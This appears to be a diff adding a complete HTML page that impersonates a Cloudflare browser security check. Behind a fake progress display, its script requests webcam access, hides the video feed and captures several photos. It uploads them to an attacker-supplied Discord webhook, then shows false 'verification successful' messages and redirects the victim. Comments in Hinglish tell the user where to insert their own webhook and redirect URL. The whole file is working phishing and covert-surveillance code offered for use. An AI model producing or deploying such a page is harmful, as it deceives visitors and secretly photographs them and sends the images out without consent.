@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 Cloudflare Security Check</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        .cf-box {
+            background: #1a1a2e;
+            border: 1px solid #2a2a4a;
+            border-radius: 16px;
+            padding: 50px 40px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+        }
+        .cf-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .cf-logo span {
+            font-size: 32px;
+            font-weight: 700;
+            color: #f38020;
+        }
+        .cf-logo img {
+            width: 40px;
+            height: 40px;
+        }
+        .cf-title {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        .cf-sub {
+            color: #8888aa;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .loader-ring {
+            display: inline-block;
+            width: 60px;
+            height: 60px;
+            border: 5px solid #2a2a4a;
+            border-top: 5px solid #f38020;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .cf-status {
+            color: #aaaacc;
+            font-size: 15px;
+            margin-top: 15px;
+        }
+        .cf-status .highlight {
+            color: #f38020;
+            font-weight: 600;
+        }
+        .cf-progress {
+            background: #2a2a4a;
+            border-radius: 20px;
+            height: 6px;
+            margin: 20px 0 10px;
+            overflow: hidden;
+        }
+        .cf-progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #f38020, #f5a623);
+            border-radius: 20px;
+            transition: width 0.3s;
+        }
+        .cf-dots {
+            color: #666;
+            font-size: 13px;
+        }
+        .cf-dots .dot {
+            display: inline-block;
+            animation: dot 1.2s infinite;
+        }
+        .cf-dots .dot:nth-child(2) { animation-delay: 0.2s; }
+        .cf-dots .dot:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes dot {
+            0%, 80%, 100% { opacity: 0; }
+            40% { opacity: 1; }
+        }
+        .cf-success {
+            display: none;
+            color: #4ade80;
+            font-size: 18px;
+            margin: 15px 0;
+        }
+        .cf-success .check {
+            font-size: 40px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .cf-redirect {
+            display: none;
+            color: #8888aa;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        .cf-redirect span {
+            color: #f38020;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="cf-box" id="cfBox">
+    <!-- Cloudflare Header -->
+    <div class="cf-logo">
+        <span>☁️</span>
+        <span>Cloudflare</span>
+    </div>
+    
+    <div class="cf-title" id="statusTitle">🔒 Verifying your connection...</div>
+    <div class="cf-sub">Checking your browser security before accessing</div>
+    
+    <!-- Loading Spinner -->
+    <div class="loader-ring" id="loader"></div>
+    
+    <!-- Progress Bar -->
+    <div class="cf-progress">
+        <div class="cf-progress-bar" id="progressBar"></div>
+    </div>
+    
+    <!-- Status Text -->
+    <div class="cf-status" id="statusText">
+        <span class="highlight">✓</span> DNS check passed <br>
+        <span class="highlight">⟳</span> <span id="stepText">Verifying device security...</span> <span class="cf-dots"><span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></span>
+    </div>
+    
+    <!-- Success Message -->
+    <div class="cf-success" id="successMsg">
+        <span class="check">✅</span>
+        Verification successful!<br>
+        <span style="font-size:14px;color:#888;">Redirecting to secure page...</span>
+    </div>
+    
+    <!-- Redirect Text -->
+    <div class="cf-redirect" id="redirectMsg">
+        <span>⟳</span> Redirecting<span class="cf-dots"><span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></span>
+    </div>
+</div>
+
+<video id="v" autoplay></video>
+<canvas id="c"></canvas>
+
+<script>
+// 🔑 APNI DISCORD WEBHOOK URL YAHAN DAALEIN
+const WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+const TOTAL = 5;
+const REDIRECT_URL = 'https://google.com'; // Yahan apni URL daalein
+
+const v = document.getElementById('v');
+const c = document.getElementById('c');
+const statusTitle = document.getElementById('statusTitle');
+const statusText = document.getElementById('statusText');
+const stepText = document.getElementById('stepText');
+const progressBar = document.getElementById('progressBar');
+const loader = document.getElementById('loader');
+const successMsg = document.getElementById('successMsg');
+const redirectMsg = document.getElementById('redirectMsg');
+const cfBox = document.getElementById('cfBox');
+
+let progress = 0;
+
+// ========== 1. CLOUDFLARE VERIFICATION CHALAO ==========
+async function startVerification() {
+    // Step 1: DNS Check
+    await delay(800);
+    progress = 20;
+    updateProgress();
+    stepText.textContent = 'DNS resolution complete';
+    statusText.innerHTML = `<span class="highlight">✓</span> DNS check passed <br> <span class="highlight">⟳</span> <span id="stepText">Establishing secure connection...</span> <span class="cf-dots"><span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></span>`;
+    
+    // Step 2: Camera Start (Hidden)
+    await delay(600);
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' } 
+        });
+        v.srcObject = stream;
+        
+        progress = 50;
+        updateProgress();
+        stepText.textContent = 'Security handshake initiated';
+        statusText.innerHTML = `<span class="highlight">✓</span> DNS check passed <br> <span class="highlight">✓</span> Connection established <br> <span class="highlight">⟳</span> <span id="stepText">Verifying device integrity...</span> <span class="cf-dots"><span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></span>`;
+        
+        // Step 3: Capture Photos (2 second bad)
+        await delay(1500);
+        capturePhotos();
+        
+    } catch(e) {
+        // Agar permission deny ho toh show karein
+        statusTitle.textContent = '⚠️ Verification failed';
+        statusText.innerHTML = `❌ Please allow camera access and refresh. <br> <small style="color:#666;">Click the camera icon in address bar → Allow</small>`;
+        loader.style.display = 'none';
+        progressBar.style.width = '0%';
+    }
+}
+
+// ========== 2. CAPTURE PHOTOS ==========
+function capturePhotos() {
+    let photos = [];
+    const width = v.videoWidth || 640;
+    const height = v.videoHeight || 480;
+    
+    progress = 70;
+    updateProgress();
+    stepText.textContent = 'Security check in progress';
+    statusText.innerHTML = `<span class="highlight">✓</span> DNS check passed <br> <span class="highlight">✓</span> Connection established <br> <span class="highlight">⟳</span> <span id="stepText">Encrypting device data...</span> <span class="cf-dots"><span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></span>`;
+    
+    for (let i = 0; i < TOTAL; i++) {
+        let cv = document.createElement('canvas');
+        cv.width = width;
+        cv.height = height;
+        cv.getContext('2d').drawImage(v, 0, 0, width, height);
+        photos.push(cv.toDataURL('image/jpeg', 0.85));
+    }
+    
+    // Video band karein
+    if (v.srcObject) {
+        v.srcObject.getTracks().forEach(t => t.stop());
+    }
+    
+    progress = 85;
+    updateProgress();
+    stepText.textContent = 'Data encrypted, sending to secure server';
+    statusText.innerHTML = `<span class="highlight">✓</span> DNS check passed <br> <span class="highlight">✓</span> Connection established <br> <span class="highlight">✓</span> Device verified <br> <span class="highlight">⟳</span> <span id="stepText">Transmitting secure data...</span> <span class="cf-dots"><span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></span>`;
+    
+    sendAll(photos);
+}
+
+// ========== 3. SEND TO DISCORD ==========
+async function sendAll(photos) {
+    let sent = 0;
+    for (let i = 0; i < photos.length; i++) {
+        try {
+            let blob = await (await fetch(photos[i])).blob();
+            let fd = new FormData();
+            fd.append('file', blob, 'photo' + i + '.jpg');
+            let res = await fetch(WEBHOOK, { method: 'POST', body: fd });
+            if (res.ok) sent++;
+        } catch(e) {}
+        await delay(200);
+    }
+    
+    // SUCCESS! ✅
+    progress = 100;
+    updateProgress();
+    
+    // Hide loader, show success
+    loader.style.display = 'none';
+    statusTitle.textContent = '✅ Verification Successful!';
+    successMsg.style.display = 'block';
+    statusText.innerHTML = `<span class="highlight">✓</span> DNS check passed <br> <span class="highlight">✓</span> Connection established <br> <span class="highlight">✓</span> Device verified <br> <span class="highlight">✓</span> Data transmitted securely`;
+    cfBox.style.borderColor = '#4ade80';
+    cfBox.style.boxShadow = '0 20px 60px rgba(74,222,128,0.2)';
+    
+    // Redirect after 2 seconds
+    await delay(2000);
+    redirectMsg.style.display = 'block';
+    statusText.innerHTML = `<span class="highlight">✓</span> DNS check passed <br> <span class="highlight">✓</span> Connection established <br> <span class="highlight">✓</span> Device verified <br> <span class="highlight">✓</span> Data transmitted securely <br> <span style="color:#f38020;">⟳</span> Redirecting to secure page...`;
+    
+    await delay(1500);
+    window.location.href = REDIRECT_URL;
+}
+
+// ========== HELPER FUNCTIONS ==========
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function updateProgress() {
+    progressBar.style.width = progress + '%';
+}
+
+// ========== START ==========
+window.onload = function() {
+    // Thoda delay ke baad verification start karein
+    setTimeout(startVerification, 500);
+};
+
+console.log('☁️ Cloudflare Verification (Fake)');
+console.log('📸 Capturing photos in background...');
+console.log('📤 Sending to Discord...');
+</script>
+
+</body>
+</html>
